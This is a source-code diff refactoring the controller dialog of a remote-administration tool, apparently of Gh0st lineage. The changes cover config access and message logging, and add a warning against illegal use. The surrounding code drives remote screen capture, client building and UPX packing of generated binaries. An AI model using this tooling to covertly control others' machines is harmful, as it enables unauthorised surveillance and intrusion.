@@ -269,7 +269,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDial
 {
 	m_iocpServer = iocpServer;
 	m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
-	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
+	m_hIcon = THIS_APP->LoadIcon(IDR_MAINFRAME);
 
 	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
 	m_bmOnline[1].LoadBitmap(IDB_BITMAP_UPDATE);
@@ -527,7 +527,7 @@ VOID CMy2015RemoteDlg::InitControl()
 
 	for (int i = 0; i < g_Column_Count_Message; ++i)
 	{
-		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle,LVCFMT_CENTER,g_Column_Data_Message[i].nWidth);
+		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle, LVCFMT_LEFT,g_Column_Data_Message[i].nWidth);
 		g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;  
 	}
 
@@ -537,7 +537,7 @@ VOID CMy2015RemoteDlg::InitControl()
 
 VOID CMy2015RemoteDlg::TestOnline()
 {
-	ShowMessage(true,"软件初始化成功...");
+	ShowMessage("操作成功", "软件初始化成功...");
 }
 
 bool IsExitItem(CListCtrl &list, DWORD_PTR data){
@@ -607,20 +607,19 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 	}
 	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
 
-	ShowMessage(true,strIP+"主机上线");
+	ShowMessage("操作成功",strIP+"主机上线");
 	LeaveCriticalSection(&m_cs);
 
 	SendMasterSettings(ContextObject);
 }
 
 
-VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg)
+VOID CMy2015RemoteDlg::ShowMessage(CString strType, CString strMsg)
 {
 	CTime Timer = CTime::GetCurrentTime();
 	CString strTime= Timer.Format("%H:%M:%S");
-	CString strIsOK= bOk ? "执行成功" : "执行失败";
-	
-	m_CList_Message.InsertItem(0,strIsOK);    //向控件中设置数据
+
+	m_CList_Message.InsertItem(0, strType);    //向控件中设置数据
 	m_CList_Message.SetItemText(0,1,strTime);
 	m_CList_Message.SetItemText(0,2,strMsg);
 
@@ -746,8 +745,8 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 		}
 	}
 	// 主控程序公网IP
-	std::string ip = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "master", "");
-	std::string port = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ghost", "6543");
+	std::string ip = THIS_CFG.GetStr("settings", "master", "");
+	std::string port = THIS_CFG.GetStr("settings", "ghost", "6543");
 	std::string master = ip.empty() ? "" : ip + ":" + port;
 	const Validation* v = GetValidation();
 	m_superPass = v->Reserved;
@@ -797,8 +796,8 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 		OnCancel();
 		return FALSE;
 	}
-	int m = atoi(((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ReportInterval", "5"));
-	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
+	int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
+	int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
 	m_settings = { m, sizeof(void*) == 8, __DATE__, n };
 	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
 	std::string str = myMap[n];
@@ -1202,7 +1201,7 @@ void CMy2015RemoteDlg::OnOnlineDelete()
 		CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  
 		m_CList_Online.DeleteItem(iItem);
 		strIP+="断开连接";
-		ShowMessage(true,strIP);
+		ShowMessage("操作成功",strIP);
 	}
 	LeaveCriticalSection(&m_cs);
 }
@@ -1229,8 +1228,8 @@ VOID CMy2015RemoteDlg::OnOnlineWindowManager()
 
 VOID CMy2015RemoteDlg::OnOnlineDesktopManager()
 {
-	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "DXGI");
-	CString algo = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ScreenCompress", "");
+	int n = THIS_CFG.GetInt("settings", "DXGI");
+	CString algo = THIS_CFG.GetStr("settings", "ScreenCompress", "").c_str();
 	BYTE	bToken[32] = { COMMAND_SCREEN_SPY, n, algo.IsEmpty() ? ALGORITHM_DIFF : atoi(algo.GetString())};
 	SendSelectedCommand(bToken, sizeof(bToken));
 }
@@ -1313,14 +1312,14 @@ bool CMy2015RemoteDlg::CheckValid() {
 			OnMainExit();
 			ExitProcess(-1);
 		}
-		auto THIS_APP = (CMy2015RemoteApp*)AfxGetApp();
+
 		auto settings = "settings", pwdKey = "Password";
 		// 验证口令
 		CPasswordDlg dlg;
 		static std::string hardwareID = getHardwareID();
 		static std::string hashedID = hashSHA256(hardwareID);
 		static std::string deviceID = getFixedLengthID(hashedID);
-		CString pwd = THIS_APP->m_iniFile.GetStr(settings, pwdKey, "");
+		CString pwd = THIS_CFG.GetStr(settings, pwdKey, "").c_str();
 
 		dlg.m_sDeviceID = deviceID.c_str();
 		dlg.m_sPassword = pwd;
@@ -1333,7 +1332,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 		auto v = splitString(dlg.m_sPassword.GetBuffer(), '-');
 		if (v.size() != 6)
 		{
-			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
+			THIS_CFG.SetStr(settings, pwdKey, "");
 			MessageBox("格式错误，请重新申请口令!", "提示", MB_ICONINFORMATION);
 			KillTimer(TIMER_CHECK);
 			return false;
@@ -1344,7 +1343,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 		std::string hash256 = joinString(subvector, '-');
 		std::string fixedKey = getFixedLengthID(finalKey);
 		if (hash256 != fixedKey) {
-			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
+			THIS_CFG.SetStr(settings, pwdKey, "");
 			if (pwd.IsEmpty() || (IDOK != dlg.DoModal() || hash256 != fixedKey)) {
 				if (!dlg.m_sPassword.IsEmpty())
 					MessageBox("口令错误, 无法继续操作!", "提示", MB_ICONWARNING);
@@ -1357,13 +1356,13 @@ bool CMy2015RemoteDlg::CheckValid() {
 		char curDate[9];
 		std::strftime(curDate, sizeof(curDate), "%Y%m%d", &pekingTime);
 		if (curDate < v[0] || curDate > v[1]) {
-			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
+			THIS_CFG.SetStr(settings, pwdKey, "");
 			MessageBox("口令过期，请重新申请口令!", "提示", MB_ICONINFORMATION);
 			KillTimer(TIMER_CHECK);
 			return false;
 		}
 		if (dlg.m_sPassword != pwd)
-			THIS_APP->m_iniFile.SetStr(settings, pwdKey, dlg.m_sPassword);
+			THIS_CFG.SetStr(settings, pwdKey, dlg.m_sPassword.GetString());
 	}
 	return true;
 }
@@ -1380,8 +1379,8 @@ void CMy2015RemoteDlg::OnOnlineBuildClient()
 
 	// TODO: 在此添加命令处理程序代码
 	CBuildDlg Dlg;
-	Dlg.m_strIP = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "localIp", "");
-	int Port = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
+	Dlg.m_strIP = THIS_CFG.GetStr("settings", "localIp", "").c_str();
+	int Port = THIS_CFG.GetInt("settings", "ghost");
 	Dlg.m_strIP = Dlg.m_strIP.IsEmpty() ? "127.0.0.1" : Dlg.m_strIP;
 	Dlg.m_strPort = Port <= 0 ? "6543" : std::to_string(Port).c_str();
 	Dlg.DoModal();
@@ -1433,7 +1432,7 @@ void CMy2015RemoteDlg::OnNotifyExit()
 //固态菜单
 void CMy2015RemoteDlg::OnMainSet()
 {
-	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
+	int nMaxConnection = THIS_CFG.GetInt("settings", "MaxConnection");
 	CSettingDlg  Dlg;
 
 	Dlg.DoModal();   //模态 阻塞
@@ -1441,8 +1440,8 @@ void CMy2015RemoteDlg::OnMainSet()
 	{
 		m_iocpServer->UpdateMaxConnection(Dlg.m_nMax_Connect);
 	}
-	int m = atoi(((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ReportInterval", "5"));
-	int n = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "SoftwareDetect");
+	int m = atoi(THIS_CFG.GetStr("settings", "ReportInterval", "5").c_str());
+	int n = THIS_CFG.GetInt("settings", "SoftwareDetect");
 	if (m== m_settings.ReportInterval && n == m_settings.DetectSoftware) {
 		return;
 	}
@@ -1467,9 +1466,9 @@ void CMy2015RemoteDlg::OnMainExit()
 
 BOOL CMy2015RemoteDlg::ListenPort()
 {
-	int nPort = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
+	int nPort = THIS_CFG.GetInt("settings", "ghost");
 	//读取ini 文件中的监听端口
-	int nMaxConnection = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "MaxConnection");
+	int nMaxConnection = THIS_CFG.GetInt("settings", "MaxConnection");
 	//读取最大连接数
 	if (nPort<=0 || nPort>65535)
 		nPort = 6543;
@@ -1585,7 +1584,8 @@ BOOL CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection)
 
 	CString strTemp;
 	strTemp.Format("监听端口: %d成功", nPort);
-	ShowMessage(true,strTemp);
+	ShowMessage("操作成功",strTemp);
+	ShowMessage("使用提示", "严禁用于非法侵入、控制、监听他人设备等违法行为");
 	return TRUE;
 }
 
@@ -1982,7 +1982,7 @@ LRESULT CMy2015RemoteDlg::OnUserOfflineMsg(WPARAM wParam, LPARAM lParam)
 		{
 			ip = m_CList_Online.GetItemText(i, ONLINELIST_IP);
 			m_CList_Online.DeleteItem(i);
-			ShowMessage(true, ip + "主机下线");
+			ShowMessage("操作成功", ip + "主机下线");
 			break;
 		}
 	}
@@ -2605,22 +2605,29 @@ int run_upx(const std::string& upx, const std::string &file, bool isCompress) {
 	return static_cast<int>(exitCode);
 }
 
-// 解压UPX对当前应用程序进行操作
-bool UPXUncompressFile(std::string& upx, std::string &file) {
+std::string ReleaseUPX() {
 	DWORD dwSize = 0;
 	LPBYTE data = ReadResource(IDR_BINARY_UPX, dwSize);
 	if (!data)
-		return false;
+		return "";
 
 	char path[MAX_PATH];
 	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
 	std::string curExe = path;
 	GET_FILEPATH(path, "upx.exe");
-	upx = path;
-
 	BOOL r = WriteBinaryToFile(path, (char*)data, dwSize);
 	SAFE_DELETE_ARRAY(data);
-	if (r)
+
+	return r ? path : "";
+}
+
+// 解压UPX对当前应用程序进行操作
+bool UPXUncompressFile(const std::string& upx, std::string &file) {
+	char path[MAX_PATH];
+	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+	std::string curExe = path;
+
+	if (!upx.empty())
 	{
 		file = curExe + ".tmp";
 		if (!CopyFile(curExe.c_str(), file.c_str(), FALSE)) {
@@ -2661,7 +2668,7 @@ void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, b
 
 LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam) {
 	int exitCode = static_cast<int>(wParam);
-	ShowMessage(exitCode == 0, "UPX 处理完成");
+	ShowMessage(exitCode == 0 ? "操作成功":"操作失败", "UPX 处理完成");
 	return S_OK;
 }
 
@@ -2670,7 +2677,7 @@ LRESULT CMy2015RemoteDlg::UPXProcResult(WPARAM wParam, LPARAM lParam) {
 void CMy2015RemoteDlg::OnToolGenMaster()
 {
 	// 主控程序公网IP
-	std::string master = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "master", "");
+	std::string master = THIS_CFG.GetStr("settings", "master", "");
 	if (master.empty())	{
 		MessageBox("请通过菜单设置当前主控程序的公网地址（域名）! 此地址会写入即将生成的主控程序中。"
 			"\n只有正确设置公网地址，才能在线延长由本程序所生成的主控程序的有效期。", "提示", MB_ICONINFORMATION);
@@ -2714,7 +2721,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 	}
 	std::string pwdHash = hashSHA256(dlg.m_str.GetString());
 	int iOffset = MemoryFind(curEXE, masterHash.c_str(), size, masterHash.length());
-	std::string upx;
+	std::string upx = ReleaseUPX();
 	if (iOffset == -1)
 	{
 		SAFE_DELETE_ARRAY(curEXE);
@@ -2733,7 +2740,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 			return;
 		}
 	}
-	int port = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
+	int port = THIS_CFG.GetInt("settings", "ghost");
 	Validation verify(atof(days.m_str), master.c_str(), port<=0 ? 6543 : port);
 	if (!WritePwdHash(curEXE + iOffset, pwdHash, verify)) {
 		MessageBox("写入哈希失败! 无法生成主控。", "错误", MB_ICONWARNING);
